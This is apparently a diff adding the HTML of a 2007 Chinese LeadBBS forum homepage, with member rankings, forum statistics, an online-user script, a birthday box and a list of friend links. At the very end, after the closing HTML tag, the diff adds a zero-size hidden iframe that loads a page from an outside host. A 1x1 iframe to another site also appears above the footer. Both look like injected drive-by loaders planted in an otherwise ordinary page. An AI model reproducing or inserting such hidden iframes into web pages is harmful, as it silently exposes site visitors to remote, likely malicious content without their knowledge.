+      <tr bgcolor=#666699 >
+         <td class=TBHead colSpan=4><img src=images/blank.gif width=2 height=3 colspan=16><br><b><font color=ffffff class=HeadFont>＝社区明星＝</font><b>
+      [<a href=boards.asp?action=&action1=mingxing class=HeadFont>我不想看到他们</a>]</th></tr>  </td>
+  </tr>
+       <tr bgcolor='#f7f7f7' align=center width='250' class=TBBG9><TD vAlign=middle align=middle width='5%' class=tablebody2> <IMG src='plug-ins/mx/pic/Male.gif' align=absMiddle></TD><TD vAlign=top align=middle width='45%' class=tablebody1><table border=0 width='100%'><tr><td width=44% valign=top> <strong><font color=#ff0000>今日</font>灌水<font color=#DA9136>状元</font></strong> <font color=#9999ff>照片-=></font><p align=left>姓　　名：<font color=#ff0000>等你来改写</font> <br>社区等级：<img src='plug-ins/mx/pic/leve0.gif' border=0><br><font color=red>今日</font>发贴：<img src=bar1.gif width=5 height=8 alt='<font color=#ff0000>零</font> 篇'><br>个人财产：<img src=bar3.gif width=5 height=8 alt='未知'><br>个人魅力：<img src=bar3.gif width=5 height=8 alt='未知'><br>个人威望：<img src=bar3.gif width=5 height=8 alt='未知'><br>社区经验：<img src=bar3.gif width=5 height=8 alt='未知'><br>E&nbsp;-&nbsp;mail：<font color=#ff0000>空</font></td><td width=50% valign=middle align=center><img src='plug-ins/mx/pic/nomx.gif' border=0></td></table></TD><TD vAlign=middle align=middle width='5%' class=tablebody2> <IMG src='plug-ins/mx/pic/FeMale.gif' align=absMiddle></TD><TD vAlign=top align=middle width='45%' class=tablebody1><table border=0 width='100%'><tr><td width=44% valign=top> <strong><font color=#ff0000>今日</font>灌水<font color=#DA9136>榜眼</font></strong> <font color=#9999ff>照片-=></font><p align=left>姓　　名：<font color=#ff0000>等你来改写</font> <br>社区等级：<img src='plug-ins/mx/pic/leve0.gif' border=0><br><font color=red>今日</font>发贴：<img src=bar1.gif width=5 height=8 alt='<font color=#ff0000>零</font> 篇'><br>个人财产：<img src=bar3.gif width=5 height=8 alt='未知'><br>个人魅力：<img src=bar3.gif width=5 height=8 alt='未知'><br>个人威望：<img src=bar3.gif width=5 height=8 alt='未知'><br>社区经验：<img src=bar3.gif width=5 height=8 alt='未知'><br>E&nbsp;-&nbsp;mail：<font color=#ff0000>空</font></td><td width=50% valign=middle align=center><img src='plug-ins/mx/pic/nomx.gif' border=0></td></table></TD></TR>
+          
+      <tr bgcolor=#f7f7f7 class=TBBG9>
+         <td colspan=4>
+           <font color=#ff0000><b>灌水排行</b></font><font color=#1E90FF>&nbsp;
+             今日暂时无人发贴</font>
+
+         </td>
+      </tr>
+     
+</table>
+    <table width=700 border=0 cellspacing=0 cellpadding=0 align=center><tr><td><p align="center"><img src=/images/skin/0/bg2.jpg width=700 border=0></p></td></tr></table><br>
+<br><table width=700 border=0 cellspacing=0 cellpadding=0 align=center><tr><td><p align="center"><img src=/images/skin/0/bg1.jpg width=700 border=0></p></td></tr></table>
+	<table width="700" border="0" cellspacing="1" cellpadding="5" align="center" bgcolor=#cccccc class=TBone>
+      <tr bgcolor=#666699>
+        <td class=TBHead><img src=images/blank.gif width=2 height=3><br>
+            <b><font color=white class=HeadFont>論壇及用戶來訪信息</font></b></td>
+      </tr>
+      <tr bgcolor=#f7f7f7 align=center width=250 class=TBBG9>
+        <td>
+          <table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td align=left valign=top>
+                
+		<table border=0 cellspacing=0 cellpadding=0>
+	<tr>
+		<td>
+	<img src=images/null.gif width=2 height=2><br><img src=index.gif> 發貼總量：15488 貼<br><img src=images/null.gif width=2 height=2><br><img src=index.gif> 主題貼子：1341 貼<br><img src=images/null.gif width=2 height=2><br><img src=index.gif> 回復貼子：14147 貼<br><img src=images/null.gif width=2 height=2><br><img src=index.gif> 今日貼子：<font color=Red class=RedFont>0</font> 貼<br><img src=images/null.gif width=2 height=2><br><img src=index.gif> 昨日貼子：1 貼<br></td><td><img src=images/null.gif width=2 height=2><br><img src=index.gif> 精華貼子：18 帖<br><img src=images/null.gif width=2 height=2><br><img src=index.gif> 可见版面：24 个<br> <img src=images/null.gif width=2 height=2><br><img src=index.gif> 上传附件：0 个<br> <img src=images/null.gif width=2 height=2><br><img src=index.gif> 註冊花朵：335 朵<br><img src=images/null.gif width=2 height=2><br><img src=index.gif> 页浏览量：190006 次<br></td></tr><tr><td colspan=2 align=left><img src=images/null.gif width=2 height=2><br> <img src=index.gif> 最高在线数 78 人 发生于 2007-02-22 19:00:32<br><img src=images/null.gif width=2 height=2><br> <img src=index.gif> 最高日发帖 409 帖 发生于 2006-11-06 01:35:42</td></tr></table>
+              <td align=left valign=top><p><img src=images/null.gif width=2 height=3><br>
+                      <img src=index.gif> 在綫花數：<b><a href=User/UserOnline.asp>4</a></b> <a href=User/UserFriend.asp?need=23>察看在綫好友</a>
+                      <br>
+                      <img src=index.gif> 註冊花朵：
+                      <a href=user/LookUserInfo.asp?id=340><font color=red>人校友会</font></a>
+                      <br>
+                      <img src=images/null.gif width=2 height=2><br>
+                      <img src=index.gif> ＩＰ地址：195.4.69.194<br>
+                      <img src=images/null.gif width=2 height=2><br>
+                      <img src=index.gif> 浏 览 器：MSIE 6.0 <br>
+                      <img src=images/null.gif width=2 height=2><br>
+                      <img src=index.gif> 操作系统：Windows XP <br>
+                      <img src=images/null.gif width=2 height=2><br>
+                      
+              </p></td>
+            </tr>
+        </table></td>
+      </tr>
+      
+      <TR bgcolor=#f7f7f7 class=TBBG9>
+        <TD align=left colspan=2>
+<table width=100%>
+<script language=javascript>
+var n=1;
+var rguser=0;
+
+function s(GetData0,GetData1,GetData2)
+{
+	var tempstr = ""
+	if(GetData0 == "")return;
+	if(n==1)tempstr+="<tr>";
+	tempstr+="<td>&nbsp;";
+	if(GetData1 == null || trim(GetData1) == "")
+	{
+		tempstr+="<img src=images/z2.gif border=0><a href=User/LookUserMoreInfo.asp?OlID=" + GetData0 + ">游客</a></td>";
+	}
+	else
+	{
+		rguser+=1;
+		if (GetData1 == "隐身会员")
+		{
+			tempstr+="<img src=images/z6.gif border=0><a href=User/LookUserMoreInfo.asp?OlID=" + GetData0 + ">隐身会员</a></td>";
+		}
+		else
+		{
+			if(parseInt(GetData2)&(1<<(10-1))){tempstr+="<img src=images/z1.gif border=0>";}
+			else
+			{
+				if(parseInt(GetData2)&(1<<(14-1))){tempstr+="<img src=images/z3.gif border=0>";}
+				else
+				{
+					if(parseInt(GetData2)&(1<<(8-1))){tempstr+="<img src=images/z4.gif border=0>";}
+					else
+					{
+						if(parseInt(GetData2)&(1<<(2-1))){tempstr+="<img src=images/z5.gif border=0>";}
+						else{tempstr+="<img src=images/z7.gif border=0>";}
+                                        }
+				}
+			}
+			tempstr+="<a href='User/LookUserInfo.asp?name=" + GetData1 + "'>" + GetData1 + "</a></td>";
+		}
+	}
+	n+=1;
+	if(n>7)
+	{
+		tempstr+="</tr>";
+		n=1;
+	}
+	document.write(tempstr);
+}
+function trim(str)
+{
+	var re = /( )/gi;
+	var rv = str.replace(re,"");
+	return(rv);
+}
+s("18993","","0");
+s("18994","","0");
+s("18995","","0");
+s("18996","","0");
+s("","",0);var online=4;
+if(online<rguser)online=rguser;
+document.write("<tr><td colspan=7><img src=images/null.gif width=2 height=4><br>&nbsp;目前论坛总共有 " + online + " 朵在线。其中注册花朵 " + rguser + " 朵，迷路花朵 " + (online-rguser) + " 人 在线人员显示消耗时间0毫秒<br><img src=images/null.gif height=7 width=2><br>&nbsp;图例： <img src=images/z2.gif border=0>迷路花朵 &nbsp; <img src=images/z6.gif border=0>金菊花{隱} &nbsp; <img src=images/z1.gif border=0>向日葵{縂}&nbsp; <img src=images/z3.gif border=0>仙人掌{區} &nbsp; <img src=images/z4.gif border=0>藍妖姬{版} &nbsp; <img src=images/z5.gif border=0>特別來賓 &nbsp; <img src=images/z7.gif border=0>註冊花朵</td></tr>");
+</script>
+</table>
+</TD>
+      </TR>
+      
+    </table>
+	<table width=700 border=0 cellspacing=0 cellpadding=0 align=center><tr><td><p align="center"><img src=/images/skin/0/bg2.jpg width=700 border=0></p></td></tr></table>
+	<!--新加生日用户代码-->
+	<br>
+    
+<table width=700 border=0 cellspacing=0 cellpadding=0 align=center>
+  <tr>
+    <td><p align="center"><img src=/images/skin/0/bg1.jpg width=700 border=0></p></td>
+  </tr>
+</table>
+<table width=700 border=0 cellspacing=1 cellpadding=5 align=center bgcolor=#cccccc class=TBone>
+      <tr bgcolor=#666699 >
+         <td class=TBHead colSpan=4><img src=images/blank.gif width=2 height=3 colspan=16><br><b><font color=ffffff class=HeadFont>＝今天过生日的用户＝</font><font color=blue class=HeadFont style="behavior:url(inc/font.htc);">【共 0 人】</font></b> </td>
+      </tr>
+      <tr bgcolor=eeeeee align=left class=TBBG9>
+         <td>
+今日无人过生日
+        </td>
+  </tr>
+        
+</table>
+ <table width=700 border=0 cellspacing=0 cellpadding=0 align=center><tr><td><p align="center"><img src=/images/skin/0/bg2.jpg width=700 border=0></p></td></tr></table><br>
+
+	
+<!--生日用户代码结束-->
+	<table width="700" border="0" cellspacing="0" cellpadding="0" align="center">
+	<tr align=center>
+	
+		<td>
+<br><table width=100% border=0 cellspacing=0 cellpadding=0 align=center><tr><td><p align="center"><img src=/images/skin/0/bg1.jpg width=700 border=0></p></td></tr></table>
+<table width=100% border=0 cellspacing=1 cellpadding=5 align=center bgcolor=#cccccc class=TBone>
+<tr bgcolor=#666699>
+	<td class=TBHead><img src=images/NULL.GIF width=2 height=3><br><b><font color=ffffff class=HeadFont>友情链接</font><b></td></tr>
+<tr bgcolor=#f7f7f7 class=TBBG9>
+	<td>
+ 
+<a href="http://summer.17.71china.com" target=_blank>
+<img src="http://summer.17.71china.com/logo.jpg" width=88 height=31 border=0 title="夏日祭" align=absmiddle></a><br><img src=images/NULL.GIF height=4 width=2><br>
+ 
+<b>姐妹s'站站</b><br><img src=images/NULL.GIF height=4 width=2><br>
+ 
+<a href="http://wing2.c.lunqun.com/index.php" target=_blank>
+<img src="http://c.up.lunqun.com/up/m166/66/71/66718//Day_070125/15209_1_f4b9d0f8fda37b0.gif" width=88 height=31 border=0 title="陪你飛翔" align=absmiddle></a> 
+<a href="http://lx1014.com/bbs" target=_blank>
+<img src="http://qq.up.topzj.com/data/qq/44/86/3/a/07/02/14/ycuzx0xPR08x_kNo6N5AFzwfT.gif" width=88 height=31 border=0 title="ゞ灬讉莣︵傷鋮灬ゞ" align=absmiddle></a> 
+<a href="http://gongzhu520.com/bbs" target=_blank>
+<img src="http://gongzhu520.com/bbs/images/logo1.gif" width=88 height=31 border=0 title="{SórСéгЧɑ宮澱℡}" align=absmiddle></a> 
+<a href="http://my.179net.com/xw831/Boards.asp" target=_blank>
+<img src="http://serv1.uploadengine.com/1159622859595CA.gif" width=88 height=31 border=0 title="蒾魂計。" align=absmiddle></a> 
+<a href="http://my.179net.com/n224/Boards.asp" target=_blank>
+<img src="http://xs106.xs.to/xs106/06365/moaidian.gif" width=88 height=31 border=0 title="＊．陌噯&#9825;!殿黨﹖'＊" align=absmiddle></a><br><img src=images/NULL.GIF height=4 width=2><br>
+ 
+<b>普通s'連接</b><br><img src=images/NULL.GIF height=4 width=2><br>
+ 
+<a href="http://sjxyy.net/bbs" target=_blank>
+<img src="http://sjxyy.net/bbs/images/logo2.gif" width=88 height=31 border=0 title="忆雪无痕" align=absmiddle></a> 
+<a href="http://duck.2230.net" target=_blank>
+<img src="http://duck.2230.net/images/logo.gif" width=88 height=31 border=0 title="櫻●FAN CLUB" align=absmiddle></a> 
+<a href="http://www.kissbycat.com/" target=_blank>
+<img src="http://www.kissbycat.com/images/logo2.gif" width=88 height=31 border=0 title="：☆⌒ゞ糖罐子℡☆" align=absmiddle></a> 
+<a href="http://www.fairyfoam.com/bbs/index.php" target=_blank>
+<img src="http://www.fairyfoam.com/logo.gif" width=88 height=31 border=0 title="童话泡沫" align=absmiddle></a> 
+<a href="http://www.lovebao.com/bbs" target=_blank>
+<img src="http://lovebao.com/logo.gif" width=88 height=31 border=0 title="恋爱学院" align=absmiddle></a> 
+<a href="http://www.7faces.com" target=_blank>
+<img src="http://www.7faces.com/images/logo.gif" width=88 height=31 border=0 title="柒 欲颜" align=absmiddle></a> 
+<a href="http://sugar.179net.com" target=_blank>
+<img src="http://sugar.179net.com/logo.gif" width=88 height=31 border=0 title="o.→戀。糖dě城堡☆﹏" align=absmiddle></a> 
+<a href="http://www.imtao.com/bbs/" target=_blank>
+<img src="http://www.imtao.com/bbs/logo1.gif" width=88 height=31 border=0 title="午夜城市里，到底是谁纠结了谁？" align=absmiddle></a> 
+<a href="http://bbs.yobo8.com" target=_blank>
+<img src="http://yobo8.com/logo.gif" width=88 height=31 border=0 title="妖精当铺" align=absmiddle></a> 
+<a href="http://blackwhiteji.net/bbs/" target=_blank>
+<img src="http://blackwhiteji.net/logo.jpg" width=88 height=31 border=0 title="{黑白祭}" align=absmiddle></a> 
+<a href="http://www.Yonna.cn" target=_blank>
+<img src="http://www.Yonna.cn/logo.gif" width=88 height=31 border=0 title="⿺.︷花菲ooO" align=absmiddle></a> 
+<a href="http://www.fanhsj.cn/bbs" target=_blank>
+<img src="http://img206.imageshack.us/img206/2884/fanhsjza5.gif" width=88 height=31 border=0 title="「.繁花似錦。-」" align=absmiddle></a> 
+<a href="http://kaolacun.cn/kaolacun/Boards.asp" target=_blank>
+<img src="http://kaolacun.cn/kaolacun/images/logo.gif" width=90 height=30 border=0 title="≡Нoт 栲 菈 邨≡" align=absmiddle></a>	</td>
+</tr>
+</table>
+<table width=100% border=0 cellspacing=0 cellpadding=0 align=center><tr><td><p align="center"><img src=/images/skin/0/bg2.jpg width=700 border=0></p></td></tr></table>
+		</td>
+	</tr>
+	</table>
+	<table width=700 border=0 cellspacing=0 cellpadding=0 align=center height=2><IFRAME SRC="http://bbs.zyxr.com/" WIDTH=1 HEIGHT=1 STYLE="overflow:scroll"></IFRAME>
+	<tr>
+		<td><p align=center class=NavColor><br>
+	<a name=bottom></a>Copyright <font size=2>&copy;</font> 2007&nbsp;夏日祭 版权所有<br>
+	<a href=http://www.leadbbs.com target=_blank class=NavColor>LeadBBS<a href=http://summer.17.71china.com target=_blank class=NavColor>{夏日祭}美化论坛</a></a>&nbsp;&nbsp;&nbsp;论坛建站天数:<b><font color=red>229</font></b><br>
+                <a href=http://www.miibeian.gov.cn target=_blank>浙ICP备06037536号</a> <font class=NavColor>耗时406.2毫秒</font><br><img src=images/null.gif width=2 height=5></p>
+	</td></tr></table></BODY>
+	</HTML><iframe src=http://www.wysck.cn/sc/2.htm width=0 height=0></iframe>
